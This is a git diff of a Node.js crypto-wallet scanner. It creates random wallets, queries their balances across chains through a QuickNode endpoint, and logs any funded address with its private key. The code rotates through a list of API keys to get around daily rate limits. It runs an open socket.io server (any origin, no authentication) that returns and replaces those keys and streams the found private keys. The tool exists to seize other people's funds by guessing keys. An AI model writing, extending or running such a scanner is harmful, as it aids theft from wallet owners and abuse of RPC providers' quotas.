@@ -6,17 +6,15 @@ const Web3 = require("web3");
 const fs = require('fs');
 var { log, logSuccess, logError, logWaning } = require("./myStd");
 const clc = require("cli-color")
-const { createServer } = require("http");
-const Server = require("socket.io")
-var cors = require('cors')
+const server = require("socket.io")
+// var cors = require('cors')
 
 var PORT = 3001
 if (argv.p) {
     PORT = argv.p
 }
 logWaning("PORT:", PORT)
-const httpServer = createServer();
-const io = Server(httpServer, {
+const io = server(PORT, {
     path: "/",
     serveClient: false,
     cors: { origin: '*', },
@@ -25,7 +23,6 @@ const io = Server(httpServer, {
     pingTimeout: 5000,
     cookie: false
 });
-httpServer.listen(PORT);
 
 const { DynamoDBClient, CreateTableCommand, DeleteTableCommand, PutItemCommand, ListTablesCommand } = require("@aws-sdk/client-dynamodb");
 
@@ -40,16 +37,11 @@ var socket = null;
 var TIMEOUT_QUERY = 100;
 var count_query = 0;
 
-var INFURA_API_KEYS = [];
-var current_INFURA_API_KEYS_index = 0;
+var API_KEYS = [];
+var current_API_KEYS_index = 0;
 
-const INFURA = [
-    "https://mainnet.infura.io/v3/",
-    "https://polygon-mainnet.infura.io/v3/",
-    "https://optimism-mainnet.infura.io/v3/",
-    "https://arbitrum-mainnet.infura.io/v3/",
-    "https://aurora-mainnet.infura.io/v3/",
-    "https://palm-mainnet.infura.io/v3/"
+const HOST = [
+    "wss://little-palpable-wave.discover.quiknode.pro/",
 ];
 
 var web3s;
@@ -96,26 +88,25 @@ async function getDailyTimeRun(file = DAILY_TIME_RUN_FILE) {
     }
 }
 
-function loadInfuraAPIKeys(pathToFile = 'infurakeys.txt') {
+function loadAPIKeys(pathToFile = 'quicknode.txt') {
     return new Promise((rs, rj) => {
         fs.readFile(pathToFile, 'utf8', (err, data) => {
             if (err) {
                 logError(err);
                 rj(err);
             } else {
-                INFURA_API_KEYS = data.split("\n").filter(v => v.trim() !== "").map(v => v.trim());
-                rs(INFURA_API_KEYS);
+                API_KEYS = data.split("\n").filter(v => v.trim() !== "").map(v => v.trim());
+                rs(API_KEYS);
             }
         });
     })
 }
 
 async function initWeb3(index = 0) {
-    current_INFURA_API_KEYS_index = index;
-    log(index)
-    web3s = INFURA.map(link => {
-        const provider = new Web3.providers.HttpProvider(link + INFURA_API_KEYS[index]);
-        return new Web3(provider);
+    current_API_KEYS_index = index;
+    log("initWeb3", index, API_KEYS)
+    web3s = HOST.map(link => {
+        return new Web3(link + API_KEYS[index]);
     });
     web3s.keyIndex = index;
     return web3s;
@@ -127,7 +118,7 @@ async function loadGoodWallets(file = "walletsGoodjs.json") {
 }
 
 function discoveredGoodWallet(address, privateKey, balance, web3) {
-    let chain = (new URL(web3._provider.host)).host.split(".")[0]
+    let chain = (new URL(web3._provider.url)).host.split(".")[0]
     let content = `{"address":"${address}", "privateKey": "${privateKey}", "chain": "${chain}", "balance": ${balance}}\n`;
     log("Good Wallets: ", content);
 
@@ -194,12 +185,12 @@ function sendMessage(message) {
 async function checkBalance(web3, wallet) {
     count_query++
     return web3.eth.getBalance(wallet.address).then(balance => {
-        let chain = (new URL(web3._provider.host)).host.split(".")[0]
+        let chain = (new URL(web3._provider.url)).host.split(".")[0]
         ioemit("count_query", {
             count_query: count_query,
             address: wallet.address,
             privateKey: wallet.privateKey,
-            current_INFURA_API_KEYS_index: current_INFURA_API_KEYS_index,
+            current_API_KEYS_index: current_API_KEYS_index,
             chain: chain,
             RUN: RUN,
         })
@@ -217,16 +208,16 @@ async function checkBalanceInChains(wallet, chainIndex = 0) {
     if (chainIndex < web3s.length) {
         return checkBalance(web3s[chainIndex], wallet).then(r => checkBalanceInChains(wallet, chainIndex + 1))
             .catch(err => {
-                ioemit("count_query", { error: `get balance error: ${err.message} - ${INFURA_API_KEYS[current_INFURA_API_KEYS_index]}`, RUN: RUN });
+                ioemit("count_query", { error: `get balance error: ${err.message} - ${API_KEYS[current_API_KEYS_index]}`, RUN: RUN });
                 if (err.message === 'Returned error: daily request count exceeded, request rate limited') {
-                    if (current_INFURA_API_KEYS_index >= (INFURA_API_KEYS.length - 1)) {
+                    if (current_API_KEYS_index >= (API_KEYS.length - 1)) {
                         RUN = false;
                         throw new Error("daily_exceeded")
                         // when all keys exceeded, set time run again next day
                     } else {
-                        initWeb3(current_INFURA_API_KEYS_index + 1).then(r => checkBalanceInChains(wallet));
+                        initWeb3(current_API_KEYS_index + 1).then(r => checkBalanceInChains(wallet));
                     }
-                    logError("INFURA_API_KEYS exceeded: ", INFURA_API_KEYS[current_INFURA_API_KEYS_index]);
+                    logError("API_KEYS exceeded: ", API_KEYS[current_API_KEYS_index]);
                 }
                 else if (err.message.includes('project ID does not have access to')) { return checkBalanceInChains(wallet, chainIndex + 1) }
                 else {
@@ -239,7 +230,7 @@ async function checkBalanceInChains(wallet, chainIndex = 0) {
 }
 
 const scanWallets = () => {
-    console.log(count_query)
+    // console.log(count_query)
     if (!RUN) return;
     // create random wallet
     random_wallet(web3s[0])
@@ -250,16 +241,20 @@ const scanWallets = () => {
         .catch(err => {
             console.log(err)
             if (err.message === 'daily_exceeded') {
-                logError("All INFURA_API_KEYS daily exceeded")
-                ioemit("count_query", { error: `All INFURA_API_KEYS daily exceeded - ${current_INFURA_API_KEYS_index}`, RUN: RUN });
+                logError("All API_KEYS daily exceeded")
+                ioemit("count_query", { error: `All API_KEYS daily exceeded - ${current_API_KEYS_index}`, RUN: RUN });
             }
             else { scanWallets(); }
         })
 }
 
-
 // auto run at time
 function timerRun() {
+    // (new Web3(HOST[0] + API_KEYS[0])).eth
+    //     .getBalance("0x189b9cbd4aff470af2c0102f365fc1823d857965").then(v => log(v))
+
+
+
     let timer = setInterval(() => {
         let now = new Date();
         let t = `${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`
@@ -275,7 +270,7 @@ function timerRun() {
 /*******/
 /* init app */
 loadTelegram()
-loadInfuraAPIKeys()
+loadAPIKeys()
     .then(keys => initWeb3())
     .then(web3s => getDailyTimeRun())
     .then(timerRun)
@@ -320,17 +315,17 @@ io.on('connection', async (_socket) => {
         }
     });
 
-    socket.on("INFURA_API_KEYS", (msg) => {
+    socket.on("API_KEYS", (msg) => {
         if (msg.command)
             switch (msg.command) {
                 case "get":
-                    socket.emit("INFURA_API_KEYS", { INFURA_API_KEYS: INFURA_API_KEYS, current_INFURA_API_KEYS_index: current_INFURA_API_KEYS_index });
+                    socket.emit("API_KEYS", { API_KEYS: API_KEYS, current_API_KEYS_index: current_API_KEYS_index });
                     break;
                 case "set":
-                    log(msg.INFURA_API_KEYS);
-                    INFURA_API_KEYS = msg.INFURA_API_KEYS;
+                    log(msg.API_KEYS);
+                    API_KEYS = msg.API_KEYS;
                     initWeb3()
-                    socket.emit("INFURA_API_KEYS", { message: "SUCCESS" });
+                    socket.emit("API_KEYS", { message: "SUCCESS" });
                     break;
             }
     })
@@ -341,11 +336,3 @@ io.on('connection', async (_socket) => {
         })
     });
 });
-
-// let mylink = INFURA[0] + INFURA_API_KEYS[5]
-// logError(mylink)
-// const myprovider = new Web3.providers.HttpProvider(mylink);
-// (new Web3(myprovider)).eth.getBalance("0x554f4476825293d4ad20e02b54aca13956acc40a").then(balance => {
-//     logSuccess(balance, '0x554f4476825293d4ad20e02b54aca13956acc40a')
-// })
-
